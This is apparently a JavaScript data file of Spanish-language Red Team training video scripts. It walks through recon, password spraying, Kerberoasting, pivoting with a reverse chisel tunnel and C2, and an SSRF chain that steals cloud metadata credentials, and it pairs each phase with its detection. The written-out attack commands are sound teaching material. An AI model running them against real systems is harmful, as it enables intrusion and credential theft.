/* Vídeos guiados del Laboratorio N3 (ofensivo / Red Team). Mismo reproductor que el resto (site.js).
   Todo es metodología formativa para laboratorio propio o ejercicios autorizados; cada fase incluye su detección. */
'use strict';
window.VIDEOS = window.VIDEOS || {};

/* 0 · Método y laboratorio */
window.VIDEOS['n3-intro'] = {
  title: 'N3 · Cómo opera un Red Team (y cómo montar el laboratorio)', badge: 'Empieza aquí',
  scenes: [
    { type: 'title', step: 'Idea', h: 'Ofensiva con permiso y método', sub: 'El N3 encadena técnicas hasta el objetivo y demuestra el impacto. Siempre en tu laboratorio o con contrato, alcance y reglas de enfrentamiento firmadas.',
      say: 'Bienvenido al nivel tres. Aquí operas como un Red Team: con método, sigilo y, sobre todo, con autorización. Vamos a ver cómo se trabaja y cómo montar el laboratorio.' },
    { type: 'title', step: 'Cadena', h: 'La cadena de ataque', sub: 'Reconocimiento → acceso inicial → escalada → Active Directory → post-explotación → evasión. Cada escritorio del N3 es una fase.',
      say: 'Todo se ordena como una cadena de ataque: reconocer, entrar, escalar, conquistar el dominio, moverse y mantenerse. Cada escritorio es una fase de esa cadena.' },
    { type: 'term', step: 'Antes de nada', title: 'reglas de enfrentamiento', prompt: '', say: 'Antes del primer paquete, lo que firmas: alcance, ventana, objetivos y lo que está prohibido. Sin esto, no hay ejercicio.',
      lines: [{ o: 'Alcance:   10.0.0.0/24 y el dominio corp.local' }, { o: 'Ventana:   L-V 20:00-06:00' }, { o: 'Objetivo:  Domain Admin + leer \\\\DC01\\flag.txt' }, { o: 'Prohibido: DoS, tocar el host anfitrión, datos reales' }] },
    { type: 'term', step: 'Laboratorio', title: 'zsh', prompt: '$ ', say: 'El laboratorio tiene dos redes host-only aisladas: corp y dmz. Tu Kali tiene una pata en cada una. Nada sale a Internet.',
      lines: [{ c: 'VBoxManage list hostonlyifs | grep -E "Name|IPAddress"' }, { o: 'Name: vboxnet1   IPAddress: 192.168.59.1   (CORP)' }, { o: 'Name: vboxnet2   IPAddress: 192.168.60.1   (DMZ)' }] },
    { type: 'term', step: 'Dominio', title: 'zsh', prompt: '$ ', say: 'Para practicar Active Directory se despliega un dominio vulnerable, como GOAD. Así tienes a quién atacar… y a quién defender.',
      lines: [{ c: 'nmap -sn 192.168.59.0/24' }, { o: 'Host 192.168.59.10  DC01   (controlador de dominio)' }, { o: 'Host 192.168.59.21  WS01   (puesto Windows)' }] },
    { type: 'title', step: 'Regla', h: 'Entender para defender', sub: 'Cada técnica ofensiva del N3 viene con su detección y mitigación. Sales sabiendo atacar tan bien como proteger.',
      say: 'La regla del nivel tres: cada ataque que aprendes trae su detección. El objetivo final no es entrar, es saber qué lo habría parado.' },
  ],
};

/* 1 · Reconocimiento */
window.VIDEOS['n3-recon'] = {
  title: 'N3 · Reconocimiento: de fuera hacia dentro', badge: 'Fase 1',
  scenes: [
    { type: 'title', step: 'Objetivo', h: 'Conocer antes de tocar', sub: 'Primero pasivo (sin tocar al objetivo), luego activo (con ruido). El recon decide todo lo demás.',
      say: 'El reconocimiento decide el ejercicio. Empezamos sin tocar nada y solo después interactuamos con el objetivo.' },
    { type: 'term', step: 'Pasivo', title: 'zsh', prompt: '$ ', say: 'Subdominios desde fuentes públicas y certificados, sin enviar un paquete al objetivo. Esto es invisible para él.',
      lines: [{ c: 'subfinder -d empresa-ejemplo.com -silent | tee recon/subs.txt' }, { o: 'portal.empresa-ejemplo.com' }, { o: 'vpn.empresa-ejemplo.com' }, { o: 'dev.empresa-ejemplo.com   <- entorno de pruebas, interesante' }] },
    { type: 'term', step: 'Vivos', title: 'zsh', prompt: '$ ', say: 'De esa lista, cuáles responden y qué tecnología corren. Aquí ya hay una interacción ligera.',
      lines: [{ c: 'cat recon/subs.txt | httpx -silent -title -tech-detect -status-code' }, { o: 'https://portal... [200] [Acceso] [nginx, PHP]' }, { o: 'https://dev...   [200] [Login] [Node.js, Express]' }] },
    { type: 'term', step: 'Activo', title: 'zsh', prompt: '$ ', say: 'Ya en el laboratorio: descubrimiento de puertos en capas, sin ir a máxima velocidad para no despertar al SOC.',
      lines: [{ c: 'nmap -sS --top-ports 100 -T3 192.168.60.0/24 -oA recon/dmz' }, { o: '192.168.60.50  22/ssh  80/http  443/https' }, { o: '192.168.60.52  445/smb 3389/rdp' }] },
    { type: 'term', step: 'Contenido', title: 'zsh', prompt: '$ ', say: 'Y lo que no está enlazado: rutas y ficheros ocultos con un buen diccionario y filtrando el ruido.',
      lines: [{ c: 'ffuf -u http://192.168.60.50/FUZZ -w raft-medium.txt -mc 200,301,403' }, { o: '/admin      [301]' }, { o: '/backup.zip [200]   <- copia del código, oro puro' }] },
    { type: 'title', step: 'Defensa', h: 'Reduce lo que se ve', sub: 'Retira subdominios y backups olvidados, quita metadatos, vigila los picos de 404 (fuzzing) y fuerza MFA en todo portal externo.',
      say: 'Al otro lado: lo que el atacante encuentra es tu inventario pendiente. Quita lo olvidado y vigila los picos de cuatro cero cuatro: son fuzzing.' },
  ],
};

/* 2 · Acceso inicial */
window.VIDEOS['n3-acceso'] = {
  title: 'N3 · Acceso inicial: el primer punto de apoyo', badge: 'Fase 2',
  scenes: [
    { type: 'title', step: 'Objetivo', h: 'Entrar sin romper nada', sub: 'Tres vías: un servicio vulnerable, credenciales débiles o la persona. Todo autorizado y medido.',
      say: 'El primer punto de apoyo llega por tres caminos: un servicio vulnerable, una credencial débil o la persona. Veamos el spraying, que es como entran de verdad.' },
    { type: 'term', step: 'Política', title: 'zsh', prompt: '$ ', say: 'Antes de probar contraseñas, averiguamos la política de bloqueo. Bloquear a cien empleados sería un incidente que causas tú.',
      lines: [{ c: 'netexec smb 192.168.59.10 --pass-pol' }, { o: 'Bloqueo tras: 5 intentos / ventana 30 min' }] },
    { type: 'term', step: 'Spray', title: 'zsh', prompt: '$ ', say: 'Spraying: una sola contraseña muy probable contra muchos usuarios, por debajo del umbral. Lento y silencioso.',
      lines: [{ c: 'netexec smb 192.168.59.10 -u usuarios.txt -p "Primavera2026!" --continue-on-success' }, { o: '[-] corp\\ana:Primavera2026!' }, { o: '[+] corp\\soporte:Primavera2026!   <- válida' }] },
    { type: 'term', step: 'Sitúate', title: 'zsh', prompt: '$ ', say: 'Con una credencial de dominio válida, ya eres un usuario normal del dominio. Ese es el billete para la fase de Active Directory.',
      lines: [{ c: 'netexec smb 192.168.59.10 -u soporte -p "Primavera2026!"' }, { o: '[+] corp\\soporte (Pwn3d! en 0 equipos, aún)' }] },
    { type: 'title', step: 'Defensa', h: 'MFA lo para casi todo', sub: 'Con segundo factor, acertar la contraseña no basta. Detecta "una contraseña contra muchos usuarios" (muchos 4625/4771 iguales).',
      say: 'La defensa de una sola medida: eme efe a. Aunque acierten la contraseña, sin el segundo factor no entran. Y en los logs, muchos fallos iguales a la vez delatan el spraying.' },
  ],
};

/* 3 · Active Directory */
window.VIDEOS['n3-ad'] = {
  title: 'N3 · Active Directory: de usuario a Domain Admin', badge: 'Fase 3',
  scenes: [
    { type: 'title', step: 'Objetivo', h: 'Mapear, no adivinar', sub: 'Con una credencial, BloodHound dibuja el camino más corto a Domain Admin. Después, Kerberos hace el resto.',
      say: 'En Active Directory no se prueban exploits: se mapean rutas de ataque. Con una sola credencial, BloodHound nos dice el camino más corto a dueño del dominio.' },
    { type: 'term', step: 'Grafo', title: 'zsh', prompt: '$ ', say: 'Con un usuario cualquiera recogemos toda la estructura del dominio: usuarios, grupos, permisos y sesiones.',
      lines: [{ c: 'bloodhound-python -d corp.local -u soporte -p "Primavera2026!" -c all -ns 192.168.59.10' }, { o: 'INFO: Found 42 users, 15 groups, 3 computers' }, { o: 'INFO: Done. Escribe 20260108_bloodhound.zip' }] },
    { type: 'term', step: 'Camino', title: 'BloodHound', prompt: '', say: 'Marcamos nuestro usuario como comprometido y pedimos el camino más corto a los Domain Admins. BloodHound dibuja la cadena exacta.',
      lines: [{ o: 'Shortest paths to Domain Admins:' }, { o: '  soporte  --MemberOf-->  Soporte TI' }, { o: '  Soporte TI  --GenericAll-->  svc_sql' }, { o: '  svc_sql  --tiene SPN-->  (Kerberoasting)' }] },
    { type: 'term', step: 'Kerberoast', title: 'zsh', prompt: '$ ', say: 'La cuenta de servicio tiene un SPN: pedimos su ticket, que va cifrado con su contraseña, y lo crackeamos sin tocar el servidor.',
      lines: [{ c: 'impacket-GetUserSPNs corp.local/soporte:"Primavera2026!" -dc-ip 192.168.59.10 -request -outputfile tgs.hash' }, { o: 'ServiceAccount: svc_sql  SPN: MSSQLSvc/...' }, { c: 'hashcat -m 13100 tgs.hash rockyou.txt' }, { o: 'svc_sql : Verano2025   <- crackeada' }] },
    { type: 'title', step: 'Defensa', h: 'Cuentas de servicio y RC4', sub: 'Contraseñas largas o gMSA, desactivar RC4, cortar las ACLs peligrosas (GenericAll) y alertar de peticiones masivas de TGS con RC4 (4769 0x17).',
      say: 'La defensa: contraseñas fuertes o cuentas gestionadas, desactivar erre cé cuatro y cortar los permisos peligrosos que BloodHound revela. Y vigilar los tickets erre cé cuatro, como en el nivel dos.' },
  ],
};

/* 4 · Post-explotación */
window.VIDEOS['n3-postexp'] = {
  title: 'N3 · Post-explotación: moverse y mantenerse', badge: 'Fase 4',
  scenes: [
    { type: 'title', step: 'Objetivo', h: 'Dentro: ¿y ahora qué?', sub: 'Pivotar a redes internas, mando y control, y persistencia reversible. Demostrar impacto sin causar daño.',
      say: 'Entrar es el principio. Ahora el operador pivota a redes que no veía, maneja sus accesos y se mantiene, todo de forma reversible.' },
    { type: 'term', step: 'Pivote', title: 'zsh', prompt: '$ ', say: 'La red interna no es accesible desde Kali, pero sí desde el host comprometido. Montamos un túnel para alcanzarla.',
      lines: [{ c: './chisel server -p 9001 --reverse   # en Kali' }, { o: 'server listening on 0.0.0.0:9001' }, { o: '# en el host comprometido: ./chisel client KALI:9001 R:socks' }] },
    { type: 'term', step: 'Alcance', title: 'zsh', prompt: '$ ', say: 'Con el túnel, mandamos nuestras herramientas por el pivote y ya vemos la red interna corp.',
      lines: [{ c: 'proxychains nmap -sT -Pn 192.168.59.0/24' }, { o: '192.168.59.30  1433/mssql   (no visible desde Kali)' }] },
    { type: 'term', step: 'C2', title: 'zsh', prompt: '$ ', say: 'Un servidor de mando y control maneja los accesos con balizas que llaman a casa. Es exactamente lo que aprendiste a cazar en el nivel dos.',
      lines: [{ c: 'sliver-server' }, { o: 'sliver > sessions' }, { o: 'ID  Transport  Remote Address      Hostname' }, { o: 'a1  https      192.168.59.21:50122 WS01' }] },
    { type: 'title', step: 'Defensa', h: 'El pivote y la baliza se ven', sub: 'Segmenta (la DMZ no debe enrutar a CORP), detecta túneles y tráfico este-oeste, y caza el beaconing por regularidad (práctica del N2).',
      say: 'Al otro lado: segmenta para que la zona expuesta no llegue a la interna, y caza la baliza por su regularidad. Cerramos el círculo con el nivel dos.' },
  ],
};

/* 5 · Web avanzada */
window.VIDEOS['n3-web'] = {
  title: 'N3 · Explotación web: cadenas hasta la nube', badge: 'Fase 5',
  scenes: [
    { type: 'title', step: 'Objetivo', h: 'Sumar fallos, no uno', sub: 'El pentester senior encadena: una SSRF «media» que llega a los metadatos de la nube se vuelve crítica.',
      say: 'La web avanzada no busca un fallo suelto, sino cadenas. Veamos una ese ese erre efe que acaba robando credenciales de la nube.' },
    { type: 'term', step: 'SSRF', title: 'zsh', prompt: '$ ', say: 'Un parámetro que trae una URL: ponemos la nuestra y el servidor nos llama. Eso es ese ese erre efe: él hace la petición por nosotros.',
      lines: [{ c: 'curl "http://sitio/importar?url=http://MI-IP/x"' }, { o: '# en nuestro listener:' }, { o: 'GET /x  (desde 192.168.60.50, la IP del servidor)' }] },
    { type: 'term', step: 'Metadatos', title: 'zsh', prompt: '$ ', say: 'Como el servidor hace la petición, le pedimos el endpoint de metadatos de la nube. En instancias mal configuradas, entrega credenciales.',
      lines: [{ c: 'curl "http://sitio/importar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/rol"' }, { o: '"AccessKeyId": "ASIA...",' }, { o: '"SecretAccessKey": "...",  "Token": "..."' }] },
    { type: 'term', step: 'Nube', title: 'zsh', prompt: '$ ', say: 'Con esas credenciales temporales ya estamos dentro de la cuenta cloud. Una ese ese erre efe media se ha vuelto crítica.',
      lines: [{ c: 'aws sts get-caller-identity' }, { o: 'Arn: arn:aws:sts::...:assumed-role/rol-web' }, { c: 'aws s3 ls' }, { o: '2026-01-08  backups-clientes   <- acceso demostrado' }] },
    { type: 'title', step: 'Defensa', h: 'Corta la cadena', sub: 'Lista blanca de destinos, bloquear 169.254.169.254, IMDSv2 con token obligatorio y segmentar para que el servidor no llegue a servicios internos.',
      say: 'La defensa corta cualquier eslabón: lista blanca de destinos, metadatos con token obligatorio y segmentación. Rompe uno y la cadena entera cae.' },
  ],
};
